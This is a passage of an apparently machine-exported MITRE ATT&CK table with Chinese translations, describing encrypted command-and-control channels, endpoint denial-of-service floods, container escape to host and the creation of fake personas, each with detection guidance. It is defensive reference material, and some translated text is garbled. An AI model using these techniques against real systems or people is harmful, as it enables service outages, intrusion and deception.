March 2021),(Citation: Medium Metamorfo Apr 2020),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: Securelist WhiteBear Aug 2017),(Citation: FireEye FIN6 April 2016),(Citation: Accenture HyperStack October 2020),(Citation: ESET Attor Oct 2019),(Citation: Juniper IcedID June 2020),(Citation: BlackBerry CostaRicto November 2020),(Citation: Mythc Documentation),(Citation: ESET GreyEnergy Oct 2018),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: CISA WellMess July 2020),(Citation: CISA Zebrocy Oct 2020),(Citation: Microsoft PLATINUM April 2016),(Citation: ESET Kobalos Feb 2021),(Citation: Prevailion DarkWatchman 2021),(Citation: Bleeping Computer Op Sharpshooter March 2019),(Citation: Check Point Pay2Key November 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: ESET Gazer Aug 2017),(Citation: Kaspersky Sodin July 2019),(Citation: Intezer Doki July 20),(Citation: Kaspersky Dridex May 2017),",加密通道：非对称加密,攻击者可以使用已知的非对称加密算法来隐藏命令和控制流量，而不是依赖通信协议提供的任何固有保护。非对称密码术，也称为公钥密码术，每方使用一个密钥对：一个可以自由分发的公共密钥和一个私有密钥。由于密钥的生成方式，发送者使用接收者的公钥加密数据，接收者使用他们的私钥解密数据。这确保只有预期的接收者可以读取加密数据。常见的公钥加密算法包括 RSA 和 ElGamal。为提高效率，许多协议（包括 SSL/TLS）在建立连接后使用对称加密，但使用非对称加密来建立或传输密钥。因此，这些协议被归类为 [非对称密码学](https://attack.mitre.org/techniques/T1573/002)。
T1573.001,Encrypted Channel: Symmetric Cryptography,"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",https://attack.mitre.org/techniques/T1573/001,16 March 2020,26 March 2020,1.0,Command and Control,"With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.

In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1573,,,,,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Proofpoint Azorult July 2018),(Citation: Intezer HiddenWasp Map 2019),(Citation: trendmicro xcsset xcode project 2020),(Citation: US-CERT BADCALL),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Talos Cobalt Strike September 2020),(Citation: TrendMicro Taidoor),(Citation: Lotus Blossom Dec 2015),(Citation: ESET RTM Feb 2017),(Citation: ESET Sednit Part 3),(Citation: Trend Micro Tick November 2019),(Citation: JPCERT ChChes Feb 2017),(Citation: ESET Sednit Part 2),(Citation: Fidelis Hi-Zor),(Citation: ESET Operation Groundbait),(Citation: Kaspersky QakBot September 2021),(Citation: ESET Zebrocy May 2019),(Citation: Microsoft DUBNIUM July 2016),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Dell Sakula),(Citation: Palo Alto Comnie),(Citation: Volexity Patchwork June 2018),(Citation: Malwarebytes KONNI Evolves Jan 2022),(Citation: Bitdefender Trickbot C2 infra Nov 2020),(Citation: FireEye APT33 Guardrail),(Citation: Novetta Blockbuster),(Citation: Symantec Hydraq Jan 2010),(Citation: FireEye APT10 April 2017),(Citation: Accenture HyperStack October 2020),(Citation: Proofpoint TA459 April 2017),(Citation: BlackBerry CostaRicto November 2020),(Citation: Unit42 BendyBear Feb 2021),(Citation: ESET ForSSHe December 2018),(Citation: Forcepoint Monsoon),(Citation: Palo Alto menuPass Feb 2017),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: ESET LightNeuron May 2019),(Citation: Kaspersky Carbanak),(Citation: Sofacy Komplex Trojan),(Citation: Scarlet Mimic Jan 2016),(Citation: Zscaler Higaisa 2020),(Citation: ESET Ebury Feb 2014),(Citation: ESET PipeMon May 2020),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: GitHub QuasarRAT),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Bisonal Mar 2020),(Citation: McAfee Lazarus Nov 2020),(Citation: FireEye APT28),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Villeneuve 2011),(Citation: JPCert TSCookie March 2018),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Bitdefender APT28 Dec 2015),(Citation: Novetta Winnti April 2015),(Citation: Recorded Future REDDELTA July 2020),(Citation: ESET Kobalos Jan 2021),(Citation: Unit 42 PingPull Jun 2022),(Citation: FireEye CARBANAK June 2017),(Citation: ESET Okrum July 2019),(Citation: McAfee GhostSecret),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Check Point APT34 April 2021),(Citation: Cisco H1N1 Part 2),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Proofpoint Bumblebee April 2022),(Citation: Red Canary NETWIRE January 2020),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Microsoft PLATINUM April 2016),(Citation: CheckPoint Bandook Nov 2020),(Citation: Baumgartner Naikon 2015),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Mandiant No Easy Breach),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: McAfee Lazarus Jul 2020),(Citation: Unit 42 Bisonal July 2018),(Citation: Kaspersky Dridex May 2017),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Kaspersky CactusPete Aug 2020),(Citation: PWC WellMess July 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: F-Secure Cosmicduke),(Citation: Check Point Warzone Feb 2020),(Citation: Unit 42 Lucifer June 2020),(Citation: NCC Group Team9 June 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: Symantec W32.Duqu),(Citation: Kaspersky Turla),(Citation: Lotus Blossom Jun 2015),(Citation: Proofpoint TA505 Mar 2018),(Citation: ESET InvisiMole June 2018),(Citation: Chaos Stolen Backdoor),(Citation: Palo Alto MoonWind March 2017),(Citation: Palo Alto Networks BBSRAT),(Citation: CrowdStrike IceApple May 2022),(Citation: CISA AppleJeus Feb 2021),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: GitHub Sliver Encryption),(Citation: PWC WellMess C2 August 2020),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Group IB GrimAgent July 2021),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Securelist APT10 March 2021),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: ESET Dukes October 2019),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Fidelis TrickBot Oct 2016),(Citation: ESET Kobalos Feb 2021),(Citation: Rancor Unit42 June 2018),(Citation: FireEye Poison Ivy),(Citation: FireEye APT30),(Citation: Forcepoint Felismus Mar 2017),(Citation: Fidelis Turbo),(Citation: Talos Frankenstein June 2019),(Citation: MSTIC FoggyWeb September 2021),(Citation: CrowdStrike Putter Panda),(Citation: Nccgroup Gh0st April 2018),(Citation: ESET Machete July 2019),(Citation: Chronicle Winnti for Linux May 2019),(Citation: Talos MuddyWater Jan 2022),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Unit 42 SeaDuke 2015),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: ESET Casbaneiro Oct 2019),(Citation: FireEye APT10 Sept 2018),(Citation: Moran 2014),(Citation: Unit42 RDAT July 2020),(Citation: Novetta-Axiom),(Citation: Bitdefender Naikon April 2021),(Citation: Securelist WhiteBear Aug 2017),(Citation: FireEye APT29),(Citation: ESET Attor Oct 2019),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: US-CERT HOTCROISSANT February 2020),(Citation: CISA WellMess July 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Novetta Blockbuster Destructive Malware),(Citation: ESET Gazer Aug 2017),",加密通道：对称密码学,攻击者可以使用已知的对称加密算法来隐藏命令和控制流量，而不是依赖通信协议提供的任何固有保护。对称加密算法使用相同的密钥进行明文加密和密文解密。常见的对称加密算法包括 AES、DES、3DES、Blowfish 和 RC4。
T1499,Endpoint Denial of Service,"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)

An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).

To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.

Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.

Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)

In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)

For attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).
",https://attack.mitre.org/techniques/T1499,18 April 2019,12 April 2022,1.1,Impact,"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.

In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.

Externally monitor the availability of services that may be targeted by an Endpoint DoS.","Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status",False,,,"Alfredo Oliveira, Trend Micro; David Fiser, @anu4is, Trend Micro; Magno Logan, @magnologan, Trend Micro; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team",,,,"CAPEC-227, CAPEC-131, CAPEC-130, CAPEC-125",Availability,,"(Citation: Talos ZxShell Oct 2014),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: ESET Dukes October 2019),(Citation: FireEye APT41 Aug 2019),(Citation: CERT-EU DDoS March 2017)",终端拒绝服务,攻击者可能会执行终端拒绝服务 (DoS) 攻击，以降低或阻止对用户的服务可用性。终端 DoS 可以通过耗尽这些服务所在的系统资源或利用系统导致持续崩溃情况来执行。示例服务包括网站、电子邮件服务、DNS 和基于 Web 的应用程序。已观察到攻击者出于政治目的进行 DoS 攻击（引文：FireEye OpPoisonedHandover 2016 年 2 月）并支持其他恶意活动，包括分心（引文：FSISAC FraudNetDoS 2012 年 9 月）、黑客行为和勒索。（引文：赛门铁克 DDoS 2014 年 10 月）终端 DoS 拒绝服务的可用性，而不会使用于提供对服务的访问的网络饱和。攻击者可以针对托管在用于提供服务的系统上的应用程序堆栈的各个层。这些层包括操作系统 (OS)、服务器应用程序（例如 Web 服务器、DNS 服务器、数据库）以及位于它们之上的（通常基于 Web 的）应用程序。攻击每一层需要不同的技术来利用各自组件独有的瓶颈。 DoS 攻击可能由分布在 Internet 上的单个系统或多个系统产生，这通常称为分布式 DoS (DDoS)。为了对终端资源执行 DoS 攻击，有几个方面适用于多种方法，包括 IP 地址欺骗和僵尸网络。攻击者可能会使用攻击系统的原始 IP 地址，或欺骗源 IP 地址，以使攻击流量更难以追溯到攻击系统或启用反射。这可以通过降低或消除网络防御设备上源地址过滤的有效性来增加防御者防御攻击的难度。僵尸网络通常用于对网络和服务进行 DDoS 攻击。大型僵尸网络可以从遍布全球互联网的系统中产生大量流量。攻击者可能有资源来构建和控制他们自己的僵尸网络基础设施，或者可能会在现有的僵尸网络上租用时间来进行攻击。在 DDoS 的一些最糟糕的情况下，使用如此多的系统来生成请求，每个系统只需要发送少量流量即可产生足够的流量来耗尽目标的资源。在这种情况下，将 DDoS 流量与合法客户端区分开来变得异常困难。僵尸网络已被用于一些最引人注目的 DDoS 攻击，例如 2012 年针对美国主要银行的一系列事件。（引用：USNYAG 伊朗僵尸网络 2016 年 3 月）全球网络（例如高流量网关路由器），其中数据包可以被更改并导致合法客户端执行将网络数据包定向到大量目标的代码。此类功能以前用于网络审查，其中客户端 HTTP 流量被修改为包含对 JavaScript 的引用，该引用生成 DDoS 代码以压倒目标 Web 服务器。（引用：ArsTechnica 中国防火墙）用于试图饱和的攻击提供网络，请参阅 [网络拒绝服务](https://attack.mitre.org/techniques/T1498)。
T1499.003,Endpoint Denial of Service: Application Exhaustion Flood,"Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",https://attack.mitre.org/techniques/T1499/003,20 February 2020,25 March 2022,1.2,Impact,"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.

In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1499,,,,,,,Availability,,",(Citation: CERT-EU DDoS March 2017)",终端拒绝服务：应用程序耗尽泛滥,攻击者可能会针对应用程序的资源密集型特性来导致拒绝服务 (DoS)，从而拒绝这些应用程序的可用性。例如，Web 应用程序中的特定功能可能是高度资源密集型的。对这些功能的重复请求可能会耗尽系统资源并拒绝访问应用程序或服务器本身。（引文：Arbor AnnualDoSreport Jan 2018）
T1499.004,Endpoint Denial of Service: Application or System Exploitation,"Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.

Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",https://attack.mitre.org/techniques/T1499/004,20 February 2020,25 March 2022,1.2,Impact,"Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack. Externally monitor the availability of services that may be targeted by an Endpoint DoS.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1499,,,,,,,Availability,,"(Citation: ESET Industroyer),(Citation: CERT-EU DDoS March 2017)",终端拒绝服务：应用程序或系统利用,攻击者可能会利用可能导致应用程序或系统崩溃并拒绝向用户提供可用性的软件漏洞。 （引用：Sucuri BIND9 2015 年 8 月）某些系统可能会在发生崩溃时自动重启关键应用程序和服务，但它们可能会被重新利用以导致持续拒绝服务 (DoS) 条件。攻击者可能会利用已知或零日漏洞使应用程序和/或系统崩溃，这也可能导致相关应用程序和/或系统处于 DoS 状态。崩溃或重新启动的应用程序或系统还可能产生其他影响，例如[数据破坏](https://attack.mitre.org/techniques/T1485)、[固件损坏](https://attack.mitre.org/techniques/ T1495)、[服务停止](https://attack.mitre.org/techniques/T1489) 等，这可能会进一步导致 DoS 条件并拒绝关键信息、应用程序和/或系统的可用性。
T1499.001,Endpoint Denial of Service: OS Exhaustion Flood,"Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.

Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)

ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",https://attack.mitre.org/techniques/T1499/001,20 February 2020,19 April 2022,1.2,Impact,"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1499,,,,,,"CAPEC-469, CAPEC-482",Availability,,",(Citation: CERT-EU DDoS March 2017)",终端拒绝服务：操作系统耗尽泛滥,攻击者可能会针对终端的操作系统 (OS) 发起拒绝服务 (DoS) 攻击。系统的操作系统负责管理有限的资源，并防止整个系统因对其容量的过度需求而不堪重负。这些攻击不需要耗尽系统上的实际资源；攻击可能会简单地耗尽操作系统自身施加的限制和可用资源。存在不同的方法来实现这一点，包括 TCP 状态耗尽攻击，例如 SYN 洪水和 ACK 洪水。（引文：Arbor AnnualDoSreport Jan 2018）使用 SYN 洪水，发送了过多的 SYN 数据包，但 3 次 TCP 握手永远不会完全的。因为每个操作系统都有它允许的最大并发 TCP 连接数，这会很快耗尽系统接收 TCP 连接新请求的能力，从而阻止访问服务器提供的任何 TCP 服务。（引用：Cloudflare SynFlood ) ACK 泛洪利用了 TCP 协议的状态特性。大量的 ACK 数据包被发送到目标。这迫使操作系统在其状态表中搜索已建立的相关 TCP 连接。因为 ACK 数据包是针对不存在的连接的，所以操作系统必须搜索整个状态表以确认不存在匹配项。当需要对大量数据包执行此操作时，计算要求可能会导致服务器变得迟缓和/或无响应，因为它必须执行消除恶意 ACK 数据包的工作。这大大减少了可用于提供目标服务的资源。（引用：Corero SYN-ACKflood）
T1499.002,Endpoint Denial of Service: Service Exhaustion Flood,"Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.

One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)

Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)",https://attack.mitre.org/techniques/T1499/002,20 February 2020,19 April 2022,1.3,Impact,"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.

In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.

Externally monitor the availability of services that may be targeted by an Endpoint DoS.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1499,,,,,,"CAPEC-488, CAPEC-489, CAPEC-528",Availability,,",(Citation: CERT-EU DDoS March 2017)",终端拒绝服务：服务耗尽泛滥,攻击者可能会针对系统提供的不同网络服务进行拒绝服务 (DoS)。攻击者通常以 DNS 和 Web 服务的可用性为目标，但也有其他目标。（引文：Arbor AnnualDoSreport Jan 2018）Web 服务器软件可以通过多种方式受到攻击，其中一些通常适用，而另一些则特定于用于提供服务的软件。此类攻击的一个示例称为简单的 HTTP 泛洪，其中攻击者向 Web 服务器发送大量 HTTP 请求以压倒它和/或在其上运行的应用程序。这种洪水依赖于原始数据量来实现目标，耗尽了受害软件提供服务所需的各种资源。（引用：Cloudflare HTTPflood）另一种变体，称为 SSL 重新协商攻击，利用了SSL/TLS。 SSL/TLS 协议套件包括客户端和服务器商定加密算法以用于后续安全连接的机制。如果启用 SSL 重新协商，则可以请求重新协商加密算法。在重新协商攻击中，攻击者建立 SSL/TLS 连接，然后继续发出一系列重新协商请求。由于加密重新协商在计算周期中具有显着的成本，因此在批量完成时可能会对服务的可用性产生影响。（引文：Arbor SSLDoS 2012 年 4 月）
T1611,Escape to Host,"Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)

There are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)

Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)

Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.",https://attack.mitre.org/techniques/T1611,30 March 2021,21 October 2022,1.3,Privilege Escalation,"Monitor for the deployment of suspicious or unknown container images and pods in your environment, particularly containers running as root. Additionally, monitor for unexpected usage of syscalls such as <code>mount</code> (as well as resulting process activity) that may indicate an attempt to escape from a privileged container to host. In Kubernetes, monitor for cluster-level events associated with changing containers' volume configurations.","Containers, Linux, Windows","Container: Container Creation, Kernel: Kernel Module Load, Process: OS API Execution, Process: Process Creation, Volume: Volume Modification",False,,,"Alfredo Oliveira, Trend Micro; Ariel Shuper, Cisco; CrowdStrike; Daniel Prizmant, Palo Alto Networks; David Fiser, @anu4is, Trend Micro; Eran Ayalon, Cybereason; Idan Frimark, Cisco; Ilan Sokol, Cybereason; Joas Antonio dos Santos, @C0d3Cr4zy, Inmetrics; Magno Logan, @magnologan, Trend Micro; Oren Ofer, Cybereason; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team; Yuval Avrahami, Palo Alto Networks","Administrator, root, User",,,,,,"(Citation: Unit 42 Siloscape Jun 2021),(Citation: Peirates GitHub),(Citation: Intezer TeamTNT September 2020),(Citation: Aqua TeamTNT August 2020),(Citation: Intezer Doki July 20),(Citation: Unit 42 Hildegard Malware),(Citation: Kubernetes Hardening Guide)",逃到宿主/沙箱逃逸/虚拟机逃逸,攻击者可能会突破容器以访问底层主机。这可以允许攻击者从主机级别或主机本身访问其他容器化资源。原则上，容器化资源应提供应用程序功能的明确分离并与主机环境隔离。（引用：Docker 概述）攻击者可以通过多种方式逃到主机环境。示例包括创建一个容器，该容器配置为使用 bind 参数挂载主机的文件系统，这允许攻击者丢弃有效负载并在主机上执行控制实用程序，例如 cron；利用特权容器在底层主机上运行命令或加载恶意内核模块；或滥用 `unshare` 和 `keyctl` 等系统调用来提升权限和窃取机密。（引用：Docker Bind Mounts）（引用：Trend Micro Privileged Container）（引用：Intezer Doki 7 月 20 日）（引用：Container Escape）（引用：Crowdstrike Kubernetes Container Escape）（引用：Keyctl-unmask）此外，攻击者可能能够利用安装了容器管理套接字（例如 docker.sock）的受感染容器通过 [ Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) 攻击者也可能通过 [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/ T1068），例如利用全局符号链接中的漏洞来访问主机的根目录。（引用：Windows Server 容器是开放的）获得对主机的访问可能为攻击者提供实现后续目标的机会，比如建立pe抵抗，在环境中横向移动，或在主机上建立命令和控制通道。
T1585,Establish Accounts,"Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)

For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)

Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1)",https://attack.mitre.org/techniques/T1585,01 October 2020,16 October 2021,1.2,Resource Development,"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.

